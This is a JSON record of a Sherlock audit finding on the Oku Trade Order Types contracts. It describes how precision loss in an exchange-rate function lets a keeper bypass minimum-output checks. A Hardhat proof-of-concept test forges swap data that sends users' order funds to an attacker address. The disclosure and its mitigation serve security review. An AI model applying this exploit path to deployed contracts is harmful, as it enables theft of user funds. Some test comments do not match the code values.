{
    "id": 62096,
    "kind": "GIT",
    "auditfirm_id": 3,
    "impact": "MEDIUM",
    "finders_count": 4,
    "protocol_id": 3333,
    "title": "M-1: Precision loss allows a mallicious user to drain amount received from orders",
    "content": "\nSource: https://github.com/sherlock-audit/2025-07-oku-trade-order-types-judging/issues/171 \n\n## Found by \nNHristov, bulgari, curly11, kangaroo\n\n### Summary\n\nPrecision loss in `AutomationMaster._getExchangeRate` will cause zero exchange rates for low-priced tokens, bypassing the `minAmountReceived` checks in `Bracket.execute`, as a malicious keeper will invoke `performUpkeep` with crafted `txData` to siphon all user funds from pending orders.\n\n### Root Cause\nIn \nhttps://github.com/sherlock-audit/2025-07-oku-trade-order-types/blob/main/oku-custom-order-types/contracts/automatedTrigger/AutomationMaster.sol#L202C1-L212C6\n\n In `AutomationMaster::_getExchangeRate` computes:\n ```solidity\n      // filepath: AutomationMaster.sol\n      function _getExchangeRate(IERC20 tokenIn, IERC20 tokenOut) internal view returns (uint256) {\n          uint256 priceIn  = oracles[tokenIn].currentValue();  // USD price scaled to 1e8\n          uint256 priceOut = oracles[tokenOut].currentValue(); // USD price scaled to 1e8\n          return (priceIn * 1e8) / priceOut;\n      }\n```\n\nBecause of integer division, when `priceIn * 1e8 < priceOut` the result rounds down to `0`. This precision loss is the root cause of the exploit.\nThis is possible when the value of one token is high while he other is kept low e.g.:\nBTC is currently valued at *120_000 USD* while a pepe coin is *0.00001137*\n\n\n### Internal Pre-conditions\n\n 1. Owner has called `[registerOracle(...)]`so that `AutomationMaster.oracles(tokenIn)` and `AutomationMaster.oracles(tokenOut)` are non-zero.\n2. A Bracket (or StopLimit/OracleLess) order exists for a cheap token whose USD price yields `exchangeRate == 0`. Initially the price the exchange rate could be bigger than 10, however e.g. BTC price has pumped or the other coin went down drastically.\n\n\n### External Pre-conditions\n\n1. Off-chain oracle (e.g. PythRelay) returns USD prices scaled to 1e8, truncating any fractional part smaller than 1e-8.\n2. The ratio `priceIn / priceOut` for a cheap token vs. an expensive token is below `1e-8`, causing `(priceIn*1e8)/priceOut` to evaluate to `0`.\n\n### Attack Path\n\n1. Initially an order is created when the exchange rate is 10 and  take profit is set to 20 and stop price to 5\n2. For a short duration of time the token price goes down 10 times of the low valued token\n3. In such case while the order amount initially could be 10_000 dollars(now valued at 1_000), the minimum amount calculated in AutomationMaster will be 0 because the precision loss in the exchange rate\n4. **Attacker forges** a malicious [encodedTxData]pointing the swap recipient at their own address.\n6. **Attacker calls**  performUpkeep and due to the base minimum amount calculated as 0, the `require` check passes and the amount that should be received to the user is now sent to the malicious user\n7. This attack vector is also possible because when high slippage values are set(no checks against that so they could be set to 10_000) as they are taken into consideration while calculating the base minimum amount\n\n### Impact\n\nUsers lose all of their pending order output tokens (WBTC) held in the Bracket, StopLimit or OracleLess contracts. The attacker (keeper) steals an unbounded amount of tokens equal to the full WBTC balance, resulting in a complete loss of user funds and any collected fees.\n\n### PoC\n\nPlace this in the `happyPath.ts` down below\n\n```javascript\ndescribe(\"when slippage is set to maximum the order funds can be stolen\", () => {\n    const stopDelta = ethers.parseUnits(\"500\", 8)\n    const strikeDelta = ethers.parseUnits(\"100\", 8)\n    const strikeBips = 500\n    const stopBips = 5000\n    const swapInBips = 500\n\n    let orderId: BigInt\n    //setup\n    before(async () => {\n        //steal money for s.Bob\n        await stealMoney(s.usdcWhale, await s.Bob.getAddress(), await s.USDC.getAddress(), s.usdcAmount)\n        await stealMoney(s.wethWhale, await s.Bob.getAddress(), await s.WETH.getAddress(), parseEther(\"250\"))\n\n        //reset test oracle price\n        // set high value for initial ETH price\n        // here we will use the price of one bitcoin instead for usdc just for demonstration purpose\n        // which currently is 120_000 USD\n        // we will also set the price of weth to a very low value\n        // like 0.02\n        // however this could be any tokens to bitcoin\n        await s.wethOracle.setPrice(ethers.parseUnits(\"1\", 8))\n        await s.usdcOracle.setPrice(ethers.parseUnits(\"120000\", 8))\n        await s.uniOracle.setPrice(s.initialUniPrice)\n        await s.opOracle.setPrice(s.initialOpPrice)\n\n        let initial = await s.Master.checkUpkeep(\"0x\")\n        expect(initial.upkeepNeeded).to.eq(false)\n\n    })\n    it(\"order with a low cost token and high cost token to usdc could lead to drain because of precision loss\", async () => {\n        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())\n\n        await s.WETH.connect(s.Bob).approve(await s.Bracket.getAddress(), s.opAmount)\n\n        //should be 833\n        console.log(\"Current Price: \", currentPrice.toString())\n        const bobBalanceBefore = await s.USDC.balanceOf(await s.Bob.getAddress())\n        console.log(\"Bob's USDC balance before: \", bobBalanceBefore.toString())\n        await s.Bracket.connect(s.Bob).createOrder(\n            \"0x\",\n            currentPrice + 10n, // 18\n            currentPrice - 1n, //7\n            parseEther(\"25\"), // 250 weth\n            await s.WETH.getAddress(),\n            await s.USDC.getAddress(),\n            await s.Bob.getAddress(),\n            0,//5 bips fee\n            500,\n            500,\n            \"0x\",\n            { value: s.fee }\n        )\n        console.log(\"Order created\")\n\n        const filter = s.Bracket.filters.BracketOrderCreated\n        const events = await s.Bracket.queryFilter(filter, -1)\n        const event = events[0].args\n        orderId = event[0]\n        expect(Number(event[0])).to.not.eq(0, \"Third order\")\n\n        //verify pending order exists\n        const list = await s.Bracket.getPendingOrders()\n        expect(list.length).to.eq(1, \"1 pending order\")\n\n        \n    })\n\n    it(\"Check upkeep\", async () => {\n        //should be no upkeep needed yet\n        let initial = await s.Master.checkUpkeep(\"0x\")\n        expect(initial.upkeepNeeded).to.eq(false)\n        initial = await s.Bracket.checkUpkeep(\"0x\")\n        expect(initial.upkeepNeeded).to.eq(false)\n\n        //decrease the price of weth currently 10 times\n        //it represents\n        await s.wethOracle.setPrice(ethers.parseUnits(\"0.001\", 8))\n        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())\n        //should be 0\n        console.log(\"Current Price: \", currentPrice.toString())\n\n        //check upkeep\n        let result = await s.Master.checkUpkeep(\"0x\")\n        expect(result.upkeepNeeded).to.eq(true, \"Upkeep is now needed\")\n        result = await s.Bracket.checkUpkeep(\"0x\")\n        expect(result.upkeepNeeded).to.eq(true, \"Upkeep is now needed\")\n\n        //check specific indexes\n        let start = 0\n        let finish = 1\n        const abi = new AbiCoder()\n        const encodedIdxs = abi.encode([\"uint96\", \"uint96\"], [start, finish])\n        result = await s.Bracket.checkUpkeep(encodedIdxs)\n        expect(result.upkeepNeeded).to.eq(true, \"first idx updeep is needed\")\n\n        console.log(\"Checking from master\")\n        result = await s.Master.checkUpkeep(encodedIdxs)\n        expect(result.upkeepNeeded).to.eq(true, \"first idx updeep is needed\")\n    })\n\n    it(\"Perform Upkeep - stop loss\", async () => {\n        //check upkeep\n\n        const result = await s.Master.checkUpkeep(\"0x\")\n\n        //get returned upkeep data\n        const data: MasterUpkeepData = await decodeUpkeepData(result.performData, s.Frank)\n\n        //get minAmountReceived\n        const minAmountReceived = await s.Master.getMinAmountReceived(data.amountIn, data.tokenIn, data.tokenOut, data.bips)\n        console.log(\"Min Amount Received: \", minAmountReceived.toString())\n        //generate encoded masterUpkeepData\n        const [,,,,,,,malicious] = await ethers.getSigners()\n        const balanceBefore = await s.USDC.balanceOf(malicious.address)\n        console.log(\"MaliciousUSDC balance before: \", balanceBefore.toString())\n\n        //we manipulate the transaction so that \n        // the receiver of the money will be the malicious address\n        // instead of the order receiver/creator\n        const encodedTxData = await generateUniTx(\n            s.router02,\n            s.UniPool,\n            malicious.address,\n            minAmountReceived,\n            data\n        )\n\n        console.log(\"Gas to performUpkeep: \", await getGas(await s.Master.performUpkeep(encodedTxData)))\n\n        const balanceAfter = await s.USDC.balanceOf(malicious.address)\n        console.log(\"Malicious USDC balance after: \", balanceAfter.toString())\n    })\n})\n```\n\n### Mitigation\n\n - In `_getExchangeRate`Switch to a higher-precision fixed-point library (e.g. 1e18) to avoid truncation to zero for small ratios \n`(priceIn * 1e18) / priceOut`\nThis needs to be taken into consideration in every function that interacts in any way with `_getExchangeRate`\n - In `Bracket.execute` add `require(baseMinAmount > 0, \"Invalid exchange rate\")` before swapping or always require that the amount out received by the contract should be > 0, this also prevents the attack vector where the slippage is set to 10_000\n \n\n\n",
    "summary": "\nThis bug report discusses a precision loss issue in a function called `_getExchangeRate` in the AutomationMaster contract. This can lead to a zero exchange rate for low-priced tokens, which can be exploited by a malicious user to steal all funds from pending orders. The root cause of this issue is due to integer division, which rounds down to zero when the value of one token is much higher than the other. This can be exploited by a malicious user who can manipulate the exchange rate and steal funds from pending orders. The impact of this bug is that users can lose all their funds and the attacker can steal an unlimited amount of tokens. A proof of concept is also provided to demonstrate how this bug can be exploited. To mitigate this issue, the developers can switch to a higher-precision fixed-point library and add a requirement to ensure that the amount received by the contract is always greater than zero. ",
    "report_date": "2025-07-31T15:00:00.000Z",
    "contest_prize_txt": "17500 USDC",
    "contest_link": "https://app.sherlock.xyz/audits/contests/1076",
    "sponsor_name": "",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "",
    "github_link": "https://github.com/sherlock-audit/2025-07-oku-trade-order-types-judging/issues/171",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "1076",
    "slug": "m-1-precision-loss-allows-a-mallicious-user-to-drain-amount-received-from-orders-sherlock-oku-trade-order-types-git",
    "firm_name": "Sherlock",
    "firm_logo_square": "sherlock_square.png",
    "protocol_name": "Oku Trade Order Types",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "curly11"
            }
        },
        {
            "wardens_warden": {
                "handle": "NHristov"
            }
        },
        {
            "wardens_warden": {
                "handle": "bulgari"
            }
        },
        {
            "wardens_warden": {
                "handle": "kangaroo"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
    },
    "protocols_protocol": {
        "name": "Oku Trade Order Types",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}